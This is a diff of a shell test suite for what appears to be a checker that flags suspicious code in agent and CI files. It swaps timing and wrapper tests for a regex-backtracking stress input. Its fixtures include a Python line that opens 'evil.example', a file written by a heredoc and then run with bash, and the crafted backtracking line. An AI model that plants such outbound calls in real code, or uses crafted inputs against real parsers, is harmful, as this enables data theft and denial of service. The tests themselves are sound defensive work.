 CASE="AC2 control: a row written for the v1.2.4 line itself rules it (exit 0): the finding is keyed by the URL line"
 check test "$rc" -eq 0; check grep -q 'ruled text' "$work/rt.out"
 
-# --- REQ-SUP-001-AC16, the search for a row's span hashes only from lines equal to body-first and compares only at
-# lines equal to body-last, with no budget: a file of about 176 KB is searched in under a second
-CASE="AC16: _body_spans finds the one span of a 176 KB text (200 lines equal to first, 200 equal to last) in under one "
-CASE+="second of process time: the search is under one second and that bound is the rule"
-check python3 - "$chk" <<'PY'
-import hashlib, importlib.util, sys, time
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
-ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-FIRST, LAST = "cat >stub <<'EOF'", "EOF"
-lines = []
-while len("\n".join(lines)) < 176000 or lines.count(LAST) < 200:
-    n = len(lines)
-    lines.append(FIRST if n % 45 == 0 else LAST if n % 45 == 20 else "echo filler line %d" % n)
-assert lines.count(FIRST) >= 200 and lines.count(LAST) >= 200, (lines.count(FIRST), lines.count(LAST))
-a, b = 45 * 7, 45 * 9 + 20
-assert lines[a] == FIRST and lines[b] == LAST
-sha = hashlib.sha256("\n".join(lines[a:b + 1]).encode()).hexdigest()
-t0 = time.process_time(); got = ac._body_spans(lines, FIRST, LAST, sha); dt = time.process_time() - t0
-print(dt)
-assert got == [(a, b)], got
-assert dt < 1.0, dt
-PY
-
-# --- REQ-SUP-001-AC16, a wrapper opener (check python3 - <<'PY'): only a wrapper bound by the hash of its definition
-CKDEF=$(grep -m1 '^check() {' "$here/pin-age-check-test.sh")
-WBODY="$BHL"
-WSPAN=$'check python3 - <<\'PY\'\n'"$WBODY"$'\nPY'
-BHW1=$'#!/bin/sh\n'"$CKDEF"$'\ncheck python3 - <<\'PY\'\n'"$WBODY"$'\nPY\n'
-BHW2=$'#!/bin/sh\ncheck() { eval "$@"; }\ncheck python3 - <<\'PY\'\n'"$WBODY"$'\nPY\n'
-bhyes "control: a span opened by check python3 - with the suite's own check() definition line" \
-  "$BHW1" "$(bhf "check python3 - <<'PY'" PY "$WSPAN")"
-bhno "a span opened by check python3 - where check() is defined differently (eval): wrapper not on the closed list" \
-  "$BHW2" "$(bhf "check python3 - <<'PY'" PY "$WSPAN")"
-
-# --- REQ-SUP-001-AC16, a file the span writes must not be used later except as data
-BHF1=$'#!/bin/sh\nf=stub\ncat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF\nbash "$f"\n'
-BHF2=$'#!/bin/sh\nf=stub\ncat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF\ngrep x "$f"\n'
-SPF=$'cat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF'
-bhyes "control: the written file is only read by grep later" "$BHF2" "$(bhf "cat >\"\$f\" <<'EOF'" EOF "$SPF")"
-bhno "the written file is run later (bash \"\$f\")" "$BHF1" "$(bhf "cat >\"\$f\" <<'EOF'" EOF "$SPF")"
+# --- REQ-SUP-001-AC16 + row 5: every regex that remains matches one idea. A line of $(cat " and 60 repeated $x, with no closing quote
+# (the input an old backtracking reader choked on), goes through the WHOLE checker in under one second: with no row, and as part of a file
+# a row binds
+RDL=$'#!/bin/sh\n: $(cat "'"$(printf '$x%.0s' $(seq 60))"$'\n'
+newcase redos "$(pyw bin/redos.sh "$RDL")"
+t0=$(date +%s%N); runck redos '{"times": {}}'; redos_ms=$(( ($(date +%s%N) - t0) / 1000000 ))
+CASE="row 5: a line of \$(cat \" and 60 repeated \$x with no closing quote goes through the whole checker (exit 0) in under one second"
+check test "$rc" -eq 0; check test "$redos_ms" -lt 1000
+bhyes "row 5: the same backtracking line below a ruled line of a file bound by its whole hash: ruled, with the whole check under one second" \
+  "$(bhh bin/bh.sh "$F0$RDL")" bin/bh.sh "$F0$RDL"
+CASE="row 5: that check ran in under one second"
+check test "$bh_ms" -lt 1000
 
 for f in bin/x.py .github/agent/x.py; do
   agentfile pyrow "$f" $'import urllib.request\nurllib.request.urlopen("https://evil.example/x")\n'
